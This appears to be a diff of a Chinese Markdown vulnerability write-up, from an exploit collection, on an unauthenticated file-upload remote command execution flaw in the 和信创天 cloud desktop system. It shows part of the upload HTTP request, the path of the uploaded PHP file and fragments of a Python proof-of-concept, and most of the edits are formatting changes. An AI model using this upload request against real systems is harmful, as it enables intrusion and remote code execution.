@@ -1,28 +1,26 @@
 # 和信创天云桌面系统 远程命令执行 RCE漏洞
 
-# 漏洞描述
+## 和信创天云桌面系统 远程命令执行 RCE漏洞
+
+## 漏洞描述
 
 和信创天云桌面系统存在默认配置导致文件上传并可以远程命令执行
 
-## 漏洞影响
+### 漏洞影响
 
 ```
 和信创天云桌面系统
 ```
 
-## 漏洞复现
+### 漏洞复现
 
 登录页面如下
 
-![](images/202202101932477.png)
-
-
+![](../.gitbook/assets/202202101932477.png)
 
 发送请求包如下
 
-
-
-```plain
+```
 POST /Upload/upload_file.php?l=1 HTTP/1.1
 Host: xxx.xxx.xx.xxx
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
@@ -42,25 +40,15 @@ Content-Type: image/avif
 ------WebKitFormBoundaryfcKRltGv--
 ```
 
-
-
 访问
 
-
-
-```plain
+```
 http://xxx.xx.xxx.xxx/Upload/1/test.php
 ```
 
+![](../.gitbook/assets/202202101932224.png)
 
-
-![](images/202202101932224.png)
-
-
-
-## 漏洞POC
-
-
+### 漏洞POC
 
 ```python
 import requests
@@ -109,6 +97,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-
-
-![](images/202202101932876.png)
+![](../.gitbook/assets/202202101932876.png)
